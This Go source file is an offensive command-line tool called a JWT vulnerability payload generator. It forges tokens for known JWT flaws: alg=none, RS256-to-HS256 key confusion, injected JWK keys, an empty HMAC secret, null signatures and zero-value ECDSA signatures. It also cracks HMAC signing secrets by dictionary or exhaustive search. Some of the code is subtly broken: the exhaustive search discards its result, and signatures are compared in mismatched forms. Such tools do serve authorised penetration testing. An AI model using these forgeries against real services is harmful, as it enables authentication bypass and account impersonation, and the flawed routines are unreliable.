package main

import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"math"
	"os"
	"strings"
)

var b64 = base64.RawURLEncoding
var jwtStr string
var fuzzFlag bool
var dictFile string
var bruteForce bool
var bruteForceString string

const (
	lowercase = "abcdefghijklmnopqrstuvwxyz"
	numbers   = "0123456789"
	// 排除掉可能引起转义问题的反斜杠 \ 和双引号 "，如果需要可以自行加上
	symbols = "!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
	s       = lowercase + numbers + symbols
)

func main() {
	// Original JWT (from your input)
	flag.StringVar(&jwtStr, "jwt", "", "jwt token")
	flag.StringVar(&dictFile, "filename", "dict/fuzz.txt", "fuzz dict filename")
	flag.BoolVar(&fuzzFlag, "fuzz", false, "fuzz")
	flag.BoolVar(&bruteForce, "brute", false, "brute force")
	flag.StringVar(&bruteForceString, "fuzz_sting", s, "brute force")
	flag.Parse()

	if jwtStr == "" {
		fmt.Println("Error: Please provide a valid JWT token, use -jwt ")
		return
	}
	fmt.Println("=== JWT Vulnerability Payload Generator ===")
	fmt.Println("Original Token:", jwtStr)
	parts := strings.Split(jwtStr, ".")
	if len(parts) != 3 {
		fmt.Println("Error: Invalid JWT format")
		return
	}
	fmt.Println("JWT Info:\n" + parseJWT(parts[1]))
	if fuzzFlag {
		result := bruteForceJWT(jwtStr, dictFile)
		if result != "" {
			fmt.Println("Success: Key found:", result)
		} else {
			fmt.Println("Key not found")
		}
		return
	}
	if bruteForce {
		result := bruteForceStringJWT(jwtStr, strings.Split(bruteForceString, ""), 4)
		if result != "" {
			fmt.Println("Success: Key found:", result)
		} else {
			fmt.Println("Key not found")
		}
		return
	}

	vlunAttack(parts[0], parts[1])
	return
}

func parseJWT(payload string) string {
	payloadBytes, _ := decodeB64(payload)
	var out bytes.Buffer
	err := json.Indent(&out, payloadBytes, "", "  ")
	if err != nil {
		return ""
	}
	return out.String()
}

func validateJWT(sigB64, alg string, dataToSign, secretCandidate string) bool {
	var computedSig []byte
	switch strings.ToUpper(alg) {
	case "HS256":
		h := hmac.New(sha256.New, []byte(secretCandidate))
		h.Write([]byte(dataToSign))
		computedSig = h.Sum(nil)
	case "HS512":
		h := hmac.New(sha512.New, []byte(secretCandidate))
		h.Write([]byte(dataToSign))
		computedSig = h.Sum(nil)
	default:
		fmt.Printf("Unsupported algorithm for brute force: %s (Currently only HS256, HS512 supported)\n", alg)
		return false
	}
	return hmac.Equal(computedSig, []byte(sigB64))
}

func bruteForceStringJWT(token string, fuzzString []string, fuzzMaxLength int) string {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		fmt.Println("Error: Invalid Token format")
		return ""
	}

	headerB64, _, sigB64 := parts[0], parts[1], parts[2]
	dataToSign := parts[0] + "." + parts[1]

	// 1. Parse Header to determine algorithm
	headerBytes, _ := decodeB64(headerB64)
	var header map[string]interface{}
	json.Unmarshal(headerBytes, &header)

	alg, ok := header["alg"].(string)
	if !ok {
		alg = "HS256" // Default
	}

	// 2. Decode original signature
	targetSig, err := decodeB64(sigB64)
	if err != nil {
		fmt.Println("Error: Cannot decode original signature", err)
		return ""
	}
	n := len(fuzzString)
	if n == 0 {
		return ""
	}

	// 依次生成长度为 1 到 fuzzMaxLength 的所有组合
	for length := 1; length <= fuzzMaxLength; length++ {
		// total 是当前长度下的总组合数: n^length
		total := int(math.Pow(float64(n), float64(length)))

		// indices 存储当前字符串每一位在 fuzzString 中的索引
		indices := make([]int, length)

		for i := 0; i < total; i++ {
			// 1. 根据当前索引构建字符串
			// 为了极致性能，可以使用 []byte 并在循环外初始化
			res := make([]byte, length)
			for j := 0; j < length; j++ {
				res[j] = []byte(fuzzString[indices[j]])[0]
			}

			validateJWT(string(targetSig), alg, dataToSign, string(res))

			// 3. 更新索引（类似于手工加法进位）
			for j := length - 1; j >= 0; j-- {
				indices[j]++
				if indices[j] < n {
					break // 没有进位，跳出更新循环
				}
				indices[j] = 0 // 产生进位，当前位归零，继续处理高位
			}
		}
	}
	return ""
}

// bruteForceJWT attempts to brute force the JWT signature using a dictionary file
func bruteForceJWT(token string, dictPath string) string {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		fmt.Println("Error: Invalid Token format")
		return ""
	}

	headerB64, _, sigB64 := parts[0], parts[1], parts[2]
	dataToSign := parts[0] + "." + parts[1]

	// 1. Parse Header to determine algorithm
	headerBytes, _ := decodeB64(headerB64)
	var header map[string]interface{}
	json.Unmarshal(headerBytes, &header)

	alg, ok := header["alg"].(string)
	if !ok {
		alg = "HS256" // Default
	}

	// 2. Decode original signature
	targetSig, err := decodeB64(sigB64)
	if err != nil {
		fmt.Println("Error: Cannot decode original signature", err)
		return ""
	}

	// 3. Open dictionary file
	file, err := os.Open(dictPath)
	if err != nil {
		fmt.Println("Error: Cannot open dictionary file", err)
		return ""
	}
	defer file.Close()

	// 4. Read line by line
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		secretCandidate := strings.TrimSpace(scanner.Text())
		if secretCandidate == "" {
			continue
		}
		if validateJWT(string(targetSig), alg, dataToSign, secretCandidate) {
			return secretCandidate
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading dictionary file:", err)
	}

	return ""
}

func vlunAttack(headerB64, payloadB64 string) {
	fmt.Println("Payloads generated below:")
	// 1. CVE-2015-2951: Alg=None Signature Bypass
	// Principle: Change alg to none and remove signature part
	generateNoneAlgAttack(headerB64, payloadB64)

	// 2. CVE-2016-10555: RS256 Public Key Confusion (Algorithm Confusion)
	// Principle: Change alg to HS256, use server's public key (PEM string) as HMAC secret
	// Note: Server public key is required here. Using placeholder for demo.
	serverPublicKey := "-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJ45...\n-----END PUBLIC KEY-----"
	generateAlgConfusionAttack(headerB64, payloadB64, serverPublicKey)

	// 3. CVE-2018-0114: Key Injection (JWK Injection)
	// Principle: Embed a controlled public key (JWK) in Header and sign with corresponding private key
	generateKeyInjectionAttack(headerB64, payloadB64)

	// 4. CVE-2019-20933 / CVE-2020-28637: Blank Password Vulnerability
	// Principle: Use empty string as HMAC secret for signing
	generateBlankPasswordAttack(headerB64, payloadB64)

	// 5. CVE-2020-28042: Null Signature
	// Principle: Keep Header and Payload, but set signature part to empty or specific null bytes
	generateNullSignatureAttack(headerB64, payloadB64)

	// 6. CVE-2022-21449: Psychic Signatures (ECDSA Bypass)
	// Principle: Java 15-18 implementation ECDSA vulnerability, verifies when r=0, s=0
	generatePsychicSignatureAttack(headerB64, payloadB64)
}

func generateNoneAlgAttack(origHeader, origPayload string) {
	//fmt.Println("\n[1] Testing CVE-2015-2951 (Alg=none)")

	// Modify Header
	newHeader := map[string]interface{}{}
	decodeJSON(origHeader, &newHeader)
	newHeader["alg"] = "none" // Key modification

	h, _ := json.Marshal(newHeader)
	newHeaderB64 := b64.EncodeToString(h)

	// Variant A: header.payload. (Trailing dot)
	tokenA := fmt.Sprintf("%s.%s.", newHeaderB64, origPayload)
	fmt.Println(tokenA)

	// Variant B: header.payload (No trailing dot - some libs parse differently)
	tokenB := fmt.Sprintf("%s.%s", newHeaderB64, origPayload)
	fmt.Println(tokenB)
}

func generateAlgConfusionAttack(origHeader, origPayload, pubKeyPEM string) {
	//fmt.Println("\n[2] Testing CVE-2016-10555 (Alg Confusion RS256 -> HS256)")
	//fmt.Println("Note: This attack requires the server's RSA public key used for verification.")

	// Modify Header to HS256
	newHeader := map[string]interface{}{}
	decodeJSON(origHeader, &newHeader)
	newHeader["alg"] = "HS256"

	h, _ := json.Marshal(newHeader)
	newHeaderB64 := b64.EncodeToString(h)

	dataToSign := newHeaderB64 + "." + origPayload

	// Use public key string content as HMAC secret
	// In real attacks, formatting (newlines) depends on target lib
	sig := signHMACSHA256(dataToSign, []byte(pubKeyPEM))

	token := fmt.Sprintf("%s.%s.%s", newHeaderB64, origPayload, sig)
	fmt.Printf(token)
}

func generateKeyInjectionAttack(origHeader, origPayload string) {
	//fmt.Println("\n[3] Testing CVE-2018-0114 (Key Injection / JWK Header)")

	// Construct a new Header containing a JWK with a known key
	// Using HMAC symmetric key injection for simplicity

	newHeader := map[string]interface{}{}
	decodeJSON(origHeader, &newHeader)
	newHeader["alg"] = "HS256"

	// Inject JWK params
	// Malicious JWK, declaring key type as oct (Octet sequence, symmetric key)
	// k is base64url encoded key content. Set key to "AAAA" here
	mySecret := "AAAA"
	mySecretB64 := b64.EncodeToString([]byte(mySecret))

	jwk := map[string]string{
		"kty": "oct",
		"k":   mySecretB64,
	}
	newHeader["jwk"] = jwk
	// Remove potentially conflicting kid
	delete(newHeader, "kid")

	h, _ := json.Marshal(newHeader)
	newHeaderB64 := b64.EncodeToString(h)

	dataToSign := newHeaderB64 + "." + origPayload

	// Sign using our injected key "AAAA"
	sig := signHMACSHA256(dataToSign, []byte(mySecret))

	token := fmt.Sprintf("%s.%s.%s", newHeaderB64, origPayload, sig)
	fmt.Printf(token)
}

func generateBlankPasswordAttack(origHeader, origPayload string) {
	//fmt.Println("\n[4] Testing CVE-2019-20933 / Blank Password")

	// Ensure algorithm is HMAC type
	newHeader := map[string]interface{}{}
	decodeJSON(origHeader, &newHeader)
	// Force to HS256 for demo
	newHeader["alg"] = "HS256"

	h, _ := json.Marshal(newHeader)
	newHeaderB64 := b64.EncodeToString(h)

	dataToSign := newHeaderB64 + "." + origPayload

	// Key: Use empty byte slice as secret
	sig := signHMACSHA256(dataToSign, []byte(""))

	token := fmt.Sprintf("%s.%s.%s", newHeaderB64, origPayload, sig)
	fmt.Println(token)
}

func generateNullSignatureAttack(origHeader, origPayload string) {
	//fmt.Println("\n[5] Testing CVE-2020-28042 (Null Signature)")

	// Variant 1: Signature part completely empty
	token1 := fmt.Sprintf("%s.%s.", origHeader, origPayload)
	fmt.Println(token1)

	// Variant 2: Signature part is Base64 of null bytes
	nullBytes := make([]byte, 32) // 32 bytes of zeros
	sig := b64.EncodeToString(nullBytes)
	token2 := fmt.Sprintf("%s.%s.%s", origHeader, origPayload, sig)
	fmt.Println(token2)
}

func generatePsychicSignatureAttack(origHeader, origPayload string) {
	//fmt.Println("\n[6] Testing CVE-2022-21449 (Psychic Signatures / ECDSA 0,0)")

	// Targeting Java 15-18 ECDSA implementation.
	// Attacker provides r=0, s=0 signature, server validates it.
	// Change Alg to ES256

	newHeader := map[string]interface{}{}
	decodeJSON(origHeader, &newHeader)
	newHeader["alg"] = "ES256"

	h, _ := json.Marshal(newHeader)
	newHeaderB64 := b64.EncodeToString(h)

	// Generate 64 bytes of zeros (32 r + 32 s)
	zeroSig := make([]byte, 64)
	sigB64 := b64.EncodeToString(zeroSig)

	token := fmt.Sprintf("%s.%s.%s", newHeaderB64, origPayload, sigB64)
	fmt.Printf(token)
}

// --- Helper Functions ---

func decodeJSON(b64Str string, v interface{}) {
	// Base64Url decode without padding
	data, err := b64.DecodeString(b64Str)
	if err != nil {
		// Try with standard padding if raw fails
		if strings.HasSuffix(b64Str, "=") {
			data, _ = base64.URLEncoding.DecodeString(b64Str)
		} else {
			// Add padding manually just in case
			pad := len(b64Str) % 4
			if pad > 0 {
				b64Str += strings.Repeat("=", 4-pad)
				data, _ = base64.URLEncoding.DecodeString(b64Str)
			}
		}
	}
	json.Unmarshal(data, v)
}

func signHMACSHA256(data string, secret []byte) string {
	h := hmac.New(sha256.New, secret)
	h.Write([]byte(data))
	return b64.EncodeToString(h.Sum(nil))
}

func decodeB64(b64Str string) ([]byte, error) {
	// Try Raw URL (No Padding)
	data, err := b64.DecodeString(b64Str)
	if err == nil {
		return data, nil
	}

	// Try with padding
	if m := len(b64Str) % 4; m != 0 {
		b64Str += strings.Repeat("=", 4-m)
	}
	return base64.URLEncoding.DecodeString(b64Str)
}
